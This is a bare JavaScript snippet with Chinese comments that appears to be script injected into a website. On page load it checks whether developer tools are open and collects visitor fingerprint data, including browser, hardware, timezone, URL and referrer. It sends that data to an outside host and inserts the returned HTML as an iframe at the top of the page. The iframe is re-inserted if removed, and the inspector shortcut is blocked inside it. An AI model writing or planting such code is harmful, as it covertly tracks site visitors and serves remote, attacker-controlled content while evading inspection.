document.addEventListener('DOMContentLoaded', function() {
    (function detectDevTools() {
      const devtools = /./;
      devtools.toString = function() {
        if (window.performance && performance.memory && performance.memory.usedJSHeapSize > 100000000) {
          // 检测到开发者工具
          console.warn('开发者工具已打开');
        }
        return '';
      };
      console.log('%c', devtools);
    })();

    const detectionData = {
      userAgent: navigator.userAgent,
      deviceMemory: navigator.deviceMemory || -1,
      hardwareConcurrency: navigator.hardwareConcurrency || -1,
      touchPoints: navigator.maxTouchPoints || -1,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
      documentLocation: location.href,
      documentReferrer: document.referrer || ''
    };

    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 5000);
  
    try {
      fetch('https://kaifa-game.com/detect-bot.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Origin': location.origin
        },
        body: JSON.stringify(detectionData),
        signal: controller.signal,
        mode: 'cors',
        credentials: 'omit'
      })
      .then(response => {
        clearTimeout(timeoutId);
        if (!response.ok) throw new Error(`HTTP错误! 状态: ${response.status}`);
        return response.text();
      })
      .then(data => {
        if (data) {
          const container = document.createElement('div');
          container.innerHTML = data;
          const iframe = container.firstChild;
          iframe.id = 'secure-iframe-' + Math.random().toString(36).substr(2, 9);
          document.body.insertBefore(iframe, document.body.firstChild);
          monitorIframe(iframe);
        }
      })
      .catch(error => {
        clearTimeout(timeoutId);
        retryRequest();
      });
    } catch (error) {
      retryRequest();
    }
  });

  function monitorIframe(iframe) {
    const checkInterval = setInterval(() => {
      if (!document.body.contains(iframe)) {
        document.body.insertBefore(iframe, document.body.firstChild);
      }
    }, 2000);

    if (iframe.contentWindow) {
      iframe.contentWindow.addEventListener('keydown', (e) => {
        if ((e.ctrlKey || e.metaKey) && e.shiftKey && e.keyCode === 73) {
          e.preventDefault();
          location.reload();
        }
      });
    }
  }

  function retryRequest() {
    setTimeout(() => location.reload(), 10000);
  }